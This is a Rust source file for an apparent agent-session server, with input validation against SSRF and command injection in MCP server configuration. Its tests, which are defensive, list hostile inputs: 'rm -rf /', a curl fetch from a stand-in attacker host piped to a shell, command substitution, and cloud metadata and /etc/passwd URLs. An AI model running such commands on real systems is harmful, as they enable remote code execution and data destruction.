use crate::{
    agent::{connect_agent, get_agent, known_agents, resume_session},
    error::AppError,
    events::spawn_ingestion_loop,
    manager::{ActiveSession, AppState, BROADCAST_CAPACITY},
    types::{
        CreateSessionRequest, CreateSessionResponse, EventsQuery, McpServerConfig, PromptBody,
        SessionMeta, SessionStatus, StoredEvent,
    },
};
use agent_client_protocol::{McpServer, McpServerHttp, McpServerSse, McpServerStdio, SessionId};
use axum::{
    extract::{Path, Query, State},
    http::StatusCode,
    Json,
};
use chrono::Utc;
use serde_json::json;
use std::sync::Arc;
use tokio::sync::broadcast;

pub async fn create(
    State(state): State<AppState>,
    Json(body): Json<CreateSessionRequest>,
) -> Result<(StatusCode, Json<CreateSessionResponse>), AppError> {
    // Bead .17 — session concurrency limit
    let max_sessions = std::env::var("MAX_SESSIONS")
        .ok()
        .and_then(|v| v.parse::<usize>().ok())
        .unwrap_or(usize::MAX);
    if state.sessions.active_count() >= max_sessions {
        return Err(AppError::InvalidRequest(format!(
            "session limit reached (MAX_SESSIONS={})",
            max_sessions
        )));
    }

    let agent_def = get_agent(&body.agent)
        .ok_or_else(|| AppError::AgentNotFound(body.agent.clone()))?;
    let handle = connect_agent(&agent_def).await.map_err(AppError::Acp)?;
    let mcp_servers = body
        .mcp_servers
        .iter()
        .enumerate()
        .map(|(index, config)| mcp_to_acp(config, index))
        .collect::<Result<Vec<_>, _>>()?;

    let cwd = validate_cwd(&body.cwd)?;
    let response = handle
        .new_session(cwd.clone(), mcp_servers)
        .await
        .map_err(AppError::Acp)?;
    let session_id = response.session_id.0.to_string();
    let created_at = Utc::now();

    let meta = SessionMeta {
        session_id: session_id.clone(),
        agent: body.agent.clone(),
        cwd: cwd.to_string_lossy().into_owned(),
        mcp_servers: body.mcp_servers.clone(),
        status: SessionStatus::Active,
        created_at,
    };

    state.sessions.registry.append(&meta).await?;
    let (tx, _rx) = broadcast::channel(BROADCAST_CAPACITY);
    state.sessions.insert(
        session_id.clone(),
        ActiveSession::new(meta, tx, Some(handle)),
    );
    spawn_ingestion_loop(Arc::clone(&state.sessions), session_id.clone());

    Ok((
        StatusCode::CREATED,
        Json(CreateSessionResponse {
            session_id,
            agent: body.agent,
            status: SessionStatus::Active,
            created_at,
        }),
    ))
}

pub async fn list(State(state): State<AppState>) -> Json<serde_json::Value> {
    Json(json!(state.sessions.registry.list_async().await))
}

pub async fn delete_session(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
) -> Result<StatusCode, AppError> {
    let known = state.sessions.registry.get_async(&session_id).await.is_some();
    let removed = state.sessions.remove(&session_id);

    if let Some(session) = removed {
        if let Some(agent) = session.agent {
            let _ = agent.close().await;
        }
    } else if !known {
        return Err(AppError::SessionNotFound(session_id));
    }

    state
        .sessions
        .registry
        .update_status(&session_id, SessionStatus::Deleted)
        .await?;
    Ok(StatusCode::NO_CONTENT)
}

pub async fn send_prompt(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
    Json(body): Json<PromptBody>,
) -> Result<StatusCode, AppError> {
    if !state.sessions.contains(&session_id) {
        if state.sessions.registry.get_async(&session_id).await.is_some() {
            return Err(AppError::SessionDead(session_id));
        }
        return Err(AppError::SessionNotFound(session_id));
    }

    let handle = state
        .sessions
        .agent_handle(&session_id)
        .ok_or_else(|| AppError::SessionDead(session_id.clone()))?;
    let session_id_for_task = session_id.clone();
    // Bead .15 — clone state so the spawned task can push error events
    let state_for_task = state.clone();
    tokio::spawn(async move {
        if let Err(error) = handle
            .prompt_text(SessionId::new(session_id.clone()), body.content)
            .await
        {
            tracing::error!(
                session_id = %session_id_for_task,
                error = %error,
                "prompt failed"
            );
            // Push synthetic error event so SSE/polling clients can observe it
            state_for_task
                .sessions
                .push_event(
                    &session_id_for_task,
                    "prompt_error".to_string(),
                    serde_json::json!({ "error": error.to_string() }),
                )
                .await;
        }
    });

    Ok(StatusCode::ACCEPTED)
}

pub async fn events(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
    Query(query): Query<EventsQuery>,
) -> Result<Json<serde_json::Value>, AppError> {
    if !state.sessions.contains(&session_id) {
        if state.sessions.registry.get_async(&session_id).await.is_some() {
            return Err(AppError::SessionDead(session_id));
        }
        return Err(AppError::SessionNotFound(session_id));
    }

    let total = state.sessions.event_count(&session_id).await;
    let events = state
        .sessions
        .get_events(&session_id, query.from, query.limit)
        .await;
    let has_more = query.from + events.len() < total;

    Ok(Json(json!({
        "events": events,
        "total": total,
        "has_more": has_more
    })))
}

pub async fn resume(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    if state.sessions.contains(&session_id) {
        return Ok(Json(json!({
            "session_id": session_id,
            "status": "active",
            "message": "already active"
        })));
    }

    let meta = state
        .sessions
        .registry
        .get_async(&session_id)
        .await
        .ok_or_else(|| AppError::SessionNotFound(session_id.clone()))?;

    // Bead .51 — re-validate cwd on resume (ALLOWED_CWD_BASE may have changed)
    validate_cwd(&meta.cwd)?;

    let agent_def = get_agent(&meta.agent)
        .ok_or_else(|| AppError::AgentNotFound(meta.agent.clone()))?;
    let handle = connect_agent(&agent_def).await.map_err(AppError::Acp)?;
    let mcp_servers = meta
        .mcp_servers
        .iter()
        .enumerate()
        .map(|(index, config)| mcp_to_acp(config, index))
        .collect::<Result<Vec<_>, _>>()?;

    resume_session(&handle, &session_id, &meta.cwd, mcp_servers)
        .await
        .map_err(AppError::Acp)?;

    // Bead .57 — load prior events from disk
    let events_path = state.sessions.session_events_path(&session_id);
    let prior_events: std::collections::VecDeque<StoredEvent> =
        if tokio::fs::try_exists(&events_path).await.unwrap_or(false) {
            let contents = tokio::fs::read_to_string(&events_path)
                .await
                .unwrap_or_default();
            contents
                .lines()
                .filter_map(|line| serde_json::from_str(line).ok())
                .collect()
        } else {
            std::collections::VecDeque::new()
        };

    let (tx, _rx) = broadcast::channel(BROADCAST_CAPACITY);
    let mut active_meta = meta.clone();
    active_meta.status = SessionStatus::Active;
    let active_session = ActiveSession::new(active_meta, tx, Some(handle));

    // Populate events from disk, restoring the monotonic counter (bead .105)
    if !prior_events.is_empty() {
        let mut events_guard = active_session.events.write().await;
        let next_index = prior_events
            .iter()
            .map(|e| e.index + 1)
            .max()
            .unwrap_or(0);
        events_guard.events = prior_events;
        events_guard.next_index = next_index;
    }

    state.sessions.insert(session_id.clone(), active_session);
    spawn_ingestion_loop(Arc::clone(&state.sessions), session_id.clone());
    state
        .sessions
        .registry
        .update_status(&session_id, SessionStatus::Active)
        .await?;

    Ok(Json(json!({
        "session_id": session_id,
        "agent": meta.agent,
        "status": "active"
    })))
}

pub async fn cancel_session(
    State(state): State<AppState>,
    Path(session_id): Path<String>,
) -> Result<StatusCode, AppError> {
    if !state.sessions.contains(&session_id) {
        if state.sessions.registry.get_async(&session_id).await.is_some() {
            return Err(AppError::SessionDead(session_id));
        }
        return Err(AppError::SessionNotFound(session_id));
    }

    let handle = state
        .sessions
        .agent_handle(&session_id)
        .ok_or_else(|| AppError::SessionDead(session_id.clone()))?;

    handle
        .cancel(SessionId::new(session_id))
        .await
        .map_err(AppError::Acp)?;

    Ok(StatusCode::NO_CONTENT)
}

pub async fn list_agents() -> Json<serde_json::Value> {
    let mut agents: Vec<_> = known_agents()
        .values()
        .map(|agent| json!({ "name": agent.name, "title": agent.title }))
        .collect();
    agents.sort_by(|left, right| left["name"].as_str().cmp(&right["name"].as_str()));
    Json(json!(agents))
}

fn validate_cwd(cwd: &str) -> Result<std::path::PathBuf, AppError> {
    let path = std::path::Path::new(cwd);

    // Must be an absolute path
    if !path.is_absolute() {
        return Err(AppError::InvalidRequest(format!(
            "cwd must be an absolute path, got: {}",
            cwd
        )));
    }

    // Canonicalize (resolves symlinks and .. components)
    let canonical = std::fs::canonicalize(path).map_err(|e| {
        AppError::InvalidRequest(format!("cwd is not a valid directory: {}: {}", cwd, e))
    })?;

    // Must be a directory
    if !canonical.is_dir() {
        return Err(AppError::InvalidRequest(format!(
            "cwd must be a directory, got: {}",
            cwd
        )));
    }

    // Optionally enforce ALLOWED_CWD_BASE prefix allowlist
    if let Ok(allowed_base) = std::env::var("ALLOWED_CWD_BASE") {
        let allowed = std::path::Path::new(&allowed_base);
        if !canonical.starts_with(allowed) {
            return Err(AppError::InvalidRequest(format!(
                "cwd '{}' is outside the allowed base directory '{}'",
                cwd, allowed_base
            )));
        }
    }

    Ok(canonical)
}

/// Bead .50 — robust SSRF validation using the `url` crate.
fn validate_mcp_url(url_str: &str) -> Result<(), AppError> {
    let url = url::Url::parse(url_str).map_err(|_| {
        AppError::InvalidRequest(format!("MCP server URL is not valid: {url_str}"))
    })?;

    match url.scheme() {
        "http" | "https" => {}
        _ => {
            return Err(AppError::InvalidRequest(format!(
                "MCP server URL must use http or https scheme: {url_str}"
            )))
        }
    }

    let host = url.host().ok_or_else(|| {
        AppError::InvalidRequest(format!("MCP server URL has no host: {url_str}"))
    })?;

    match &host {
        url::Host::Domain(domain) => {
            let lower = domain.to_lowercase();
            if lower == "localhost" || lower.ends_with(".local") {
                return Err(AppError::InvalidRequest(format!(
                    "MCP server URL targets a local/internal hostname: {url_str}"
                )));
            }
        }
        url::Host::Ipv4(addr) => {
            if is_private_ipv4(addr) {
                return Err(AppError::InvalidRequest(format!(
                    "MCP server URL targets a private/internal address: {url_str}"
                )));
            }
        }
        url::Host::Ipv6(addr) => {
            if is_private_ipv6(addr) {
                return Err(AppError::InvalidRequest(format!(
                    "MCP server URL targets a private/internal address: {url_str}"
                )));
            }
        }
    }

    Ok(())
}

fn is_private_ipv4(addr: &std::net::Ipv4Addr) -> bool {
    let o = addr.octets();
    // 127.0.0.0/8  — loopback
    o[0] == 127
    // 0.0.0.0/8
    || o[0] == 0
    // 10.0.0.0/8  — RFC-1918
    || o[0] == 10
    // 172.16.0.0/12  — RFC-1918
    || (o[0] == 172 && o[1] >= 16 && o[1] <= 31)
    // 192.168.0.0/16  — RFC-1918
    || (o[0] == 192 && o[1] == 168)
    // 169.254.0.0/16  — link-local / AWS & Azure IMDS
    || (o[0] == 169 && o[1] == 254)
}

fn is_private_ipv6(addr: &std::net::Ipv6Addr) -> bool {
    if addr.is_loopback() {
        return true;
    }
    let segs = addr.segments();
    // fe80::/10  — link-local
    if segs[0] & 0xffc0 == 0xfe80 {
        return true;
    }
    // fc00::/7  — unique local (ULA)
    if segs[0] & 0xfe00 == 0xfc00 {
        return true;
    }
    // ::ffff:0:0/96  — IPv6-mapped IPv4; check the mapped v4 address
    if segs[0] == 0
        && segs[1] == 0
        && segs[2] == 0
        && segs[3] == 0
        && segs[4] == 0
        && segs[5] == 0xffff
    {
        let v4 = std::net::Ipv4Addr::new(
            (segs[6] >> 8) as u8,
            segs[6] as u8,
            (segs[7] >> 8) as u8,
            segs[7] as u8,
        );
        return is_private_ipv4(&v4);
    }
    false
}

fn validate_stdio_command(command: &str) -> Result<(), AppError> {
    // Reject empty commands.
    if command.trim().is_empty() {
        return Err(AppError::InvalidRequest(
            "MCP stdio command must not be empty".to_string(),
        ));
    }

    // Reject shell metacharacters that indicate injection attempts.
    let shell_metacharacters = [';', '|', '&', '`'];
    for ch in shell_metacharacters {
        if command.contains(ch) {
            return Err(AppError::InvalidRequest(format!(
                "MCP stdio command contains forbidden shell metacharacter: {ch}"
            )));
        }
    }
    if command.contains("$(") || command.contains("${") {
        return Err(AppError::InvalidRequest(
            "MCP stdio command contains forbidden shell substitution".to_string(),
        ));
    }

    // Allowlist: only permit known-safe MCP server executables.
    // Operators can extend this list via the ALLOWED_STDIO_COMMANDS env var
    // (comma-separated basenames or full paths).
    let default_allowed = ["claude-agent-acp", "claude"];
    let env_allowed = std::env::var("ALLOWED_STDIO_COMMANDS").unwrap_or_default();
    let env_commands: Vec<&str> = env_allowed
        .split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect();

    let command_basename = std::path::Path::new(command)
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or(command);

    let allowed = default_allowed.contains(&command_basename)
        || env_commands.contains(&command_basename)
        || env_commands.contains(&command);

    if !allowed {
        return Err(AppError::InvalidRequest(format!(
            "MCP stdio command '{}' is not in the allowed list. \
             Set ALLOWED_STDIO_COMMANDS env var to permit additional commands.",
            command_basename
        )));
    }

    Ok(())
}

/// Bead .49 — validate individual stdio args against the same injection rules.
fn validate_stdio_arg(arg: &str) -> Result<(), AppError> {
    // Reject shell metacharacters.
    let shell_metacharacters = [';', '|', '&', '`', '>', '<'];
    for ch in shell_metacharacters {
        if arg.contains(ch) {
            return Err(AppError::InvalidRequest(format!(
                "MCP stdio arg contains forbidden shell metacharacter: {ch}"
            )));
        }
    }
    // Reject shell substitution patterns.
    if arg.contains("$(") || arg.contains("${") {
        return Err(AppError::InvalidRequest(
            "MCP stdio arg contains forbidden shell substitution".to_string(),
        ));
    }
    // Reject newlines and null bytes.
    if arg.contains('\n') || arg.contains('\r') || arg.contains('\0') {
        return Err(AppError::InvalidRequest(
            "MCP stdio arg contains forbidden control character (newline or null)".to_string(),
        ));
    }
    Ok(())
}

fn mcp_to_acp(config: &McpServerConfig, index: usize) -> Result<McpServer, AppError> {
    match config {
        McpServerConfig::Sse { url } => {
            validate_mcp_url(url)?;
            Ok(McpServer::Sse(McpServerSse::new(
                format!("mcp-sse-{index}"),
                url.clone(),
            )))
        }
        McpServerConfig::Http { url } => {
            validate_mcp_url(url)?;
            Ok(McpServer::Http(McpServerHttp::new(
                format!("mcp-http-{index}"),
                url.clone(),
            )))
        }
        McpServerConfig::Stdio { command, args } => {
            // Bead .49 — validate each arg as well as the command
            validate_stdio_command(command)?;
            for arg in args {
                validate_stdio_arg(arg)?;
            }
            Ok(McpServer::Stdio(
                McpServerStdio::new(format!("mcp-stdio-{index}"), command.clone())
                    .args(args.clone()),
            ))
        }
    }
}

#[cfg(test)]
mod stdio_tests {
    use super::*;

    // Serialise tests that mutate ALLOWED_STDIO_COMMANDS to prevent races
    // when cargo test runs them in parallel.
    static ENV_MUTEX: std::sync::LazyLock<std::sync::Mutex<()>> =
        std::sync::LazyLock::new(|| std::sync::Mutex::new(()));

    #[test]
    fn test_validate_stdio_command_blocks_shells() {
        // These are no longer in a blocklist but are not in the allowlist either,
        // so they must still be rejected.
        assert!(validate_stdio_command("bash").is_err());
        assert!(validate_stdio_command("/bin/sh").is_err());
        assert!(validate_stdio_command("/usr/bin/python3").is_err());
        assert!(validate_stdio_command("nc").is_err());
    }

    #[test]
    fn test_validate_stdio_command_blocks_metacharacters() {
        assert!(validate_stdio_command("echo; rm -rf /").is_err());
        assert!(validate_stdio_command("cmd|bash").is_err());
        assert!(validate_stdio_command("$(evil)").is_err());
    }

    #[test]
    fn test_validate_stdio_command_permits_allowlisted_commands() {
        assert!(validate_stdio_command("claude-agent-acp").is_ok());
        assert!(validate_stdio_command("claude").is_ok());
    }

    #[test]
    fn test_validate_stdio_command_rejects_formerly_permitted_commands() {
        // npx and arbitrary paths are no longer allowed by default.
        assert!(validate_stdio_command("npx").is_err());
        assert!(validate_stdio_command("./mcp-server").is_err());
        assert!(validate_stdio_command("/usr/local/bin/my-mcp-server").is_err());
    }

    #[test]
    fn test_validate_stdio_command_rejects_empty() {
        assert!(validate_stdio_command("").is_err());
        assert!(validate_stdio_command("   ").is_err());
    }

    #[test]
    fn test_validate_stdio_command_blocks_shell_substitution() {
        assert!(validate_stdio_command("${PATH}").is_err());
        assert!(validate_stdio_command("$(whoami)").is_err());
    }

    #[test]
    fn test_validate_stdio_command_env_var_extends_allowlist() {
        let _guard = ENV_MUTEX.lock().unwrap();
        // Basename match via env var.
        std::env::set_var("ALLOWED_STDIO_COMMANDS", "my-mcp-server,another-tool");
        assert!(validate_stdio_command("my-mcp-server").is_ok());
        assert!(validate_stdio_command("/usr/local/bin/my-mcp-server").is_ok());
        assert!(validate_stdio_command("another-tool").is_ok());
        // Commands not in env var are still rejected.
        assert!(validate_stdio_command("npx").is_err());
        std::env::remove_var("ALLOWED_STDIO_COMMANDS");
    }

    #[test]
    fn test_validate_stdio_command_env_var_full_path_match() {
        let _guard = ENV_MUTEX.lock().unwrap();
        // Full path can also be specified directly in env var.
        std::env::set_var("ALLOWED_STDIO_COMMANDS", "/opt/custom/mcp-server");
        assert!(validate_stdio_command("/opt/custom/mcp-server").is_ok());
        // A different path with the same basename is NOT allowed (only exact or basename).
        assert!(validate_stdio_command("/other/mcp-server").is_err());
        std::env::remove_var("ALLOWED_STDIO_COMMANDS");
    }

    // Bead .49 — arg validation tests
    #[test]
    fn test_validate_stdio_arg_blocks_injection() {
        // -S flag with embedded shell command (the original attack vector)
        assert!(validate_stdio_arg("-S bash -c curl attacker.com|sh").is_err());
        assert!(validate_stdio_arg("$(evil)").is_err());
        assert!(validate_stdio_arg("${PATH}").is_err());
        assert!(validate_stdio_arg("arg;evil").is_err());
        assert!(validate_stdio_arg("arg|evil").is_err());
        assert!(validate_stdio_arg("arg&evil").is_err());
        assert!(validate_stdio_arg(">output").is_err());
        assert!(validate_stdio_arg("<input").is_err());
        assert!(validate_stdio_arg("arg\nevil").is_err());
        assert!(validate_stdio_arg("arg\revil").is_err());
        assert!(validate_stdio_arg("arg\0evil").is_err());
    }

    #[test]
    fn test_validate_stdio_arg_permits_safe_args() {
        assert!(validate_stdio_arg("--config").is_ok());
        assert!(validate_stdio_arg("/path/to/config.json").is_ok());
        assert!(validate_stdio_arg("some-value").is_ok());
        assert!(validate_stdio_arg("").is_ok()); // empty arg is fine
    }
}

#[cfg(test)]
mod cwd_tests {
    use super::*;

    #[test]
    fn test_validate_cwd_requires_absolute_path() {
        assert!(validate_cwd("relative/path").is_err());
        assert!(validate_cwd("./relative").is_err());
        assert!(validate_cwd("../traversal").is_err());
    }

    #[test]
    fn test_validate_cwd_accepts_valid_absolute_dir() {
        // /tmp always exists and is a directory
        assert!(validate_cwd("/tmp").is_ok());
    }

    #[test]
    fn test_validate_cwd_rejects_nonexistent_path() {
        assert!(validate_cwd("/tmp/this-path-should-not-exist-12345678").is_err());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_mcp_url_blocks_private_ips() {
        // RFC-1918 and loopback addresses must be rejected.
        assert!(validate_mcp_url("http://10.0.0.1/api").is_err());
        assert!(validate_mcp_url("http://192.168.1.1/api").is_err());
        assert!(validate_mcp_url("http://169.254.169.254/latest/meta-data/").is_err());
        assert!(validate_mcp_url("http://127.0.0.1:8080/api").is_err());
        // Sensitive hostnames must be rejected.
        assert!(validate_mcp_url("http://localhost/api").is_err());
        assert!(validate_mcp_url("http://myservice.local/api").is_err());
        // Non-http schemes must be rejected.
        assert!(validate_mcp_url("ftp://example.com/").is_err());
        assert!(validate_mcp_url("file:///etc/passwd").is_err());
        // Public addresses must be accepted.
        assert!(validate_mcp_url("https://example.com/api").is_ok());
        assert!(validate_mcp_url("http://example.com:3000/api").is_ok());
        assert!(validate_mcp_url("https://api.example.com/v1/mcp").is_ok());
    }

    #[test]
    fn test_validate_mcp_url_blocks_172_16_range() {
        // All 172.16.x.x–172.31.x.x must be blocked.
        assert!(validate_mcp_url("http://172.16.0.1/api").is_err());
        assert!(validate_mcp_url("http://172.31.255.255/api").is_err());
        // 172.15.x.x and 172.32.x.x are public and must be allowed.
        assert!(validate_mcp_url("http://172.15.0.1/api").is_ok());
        assert!(validate_mcp_url("http://172.32.0.1/api").is_ok());
    }

    // Bead .50 — IPv6 bypass tests
    #[test]
    fn test_validate_mcp_url_blocks_ipv6_loopback() {
        assert!(validate_mcp_url("http://[::1]:8080/").is_err());
        assert!(validate_mcp_url("http://[::1]/api").is_err());
    }

    #[test]
    fn test_validate_mcp_url_blocks_ipv6_mapped_ipv4() {
        assert!(validate_mcp_url("http://[::ffff:127.0.0.1]/").is_err());
        assert!(validate_mcp_url("http://[::ffff:192.168.1.1]/").is_err());
        assert!(validate_mcp_url("http://[::ffff:10.0.0.1]/").is_err());
    }

    #[test]
    fn test_validate_mcp_url_blocks_ipv6_link_local_and_ula() {
        assert!(validate_mcp_url("http://[fe80::1]/").is_err());
        assert!(validate_mcp_url("http://[fc00::1]/").is_err());
    }
}
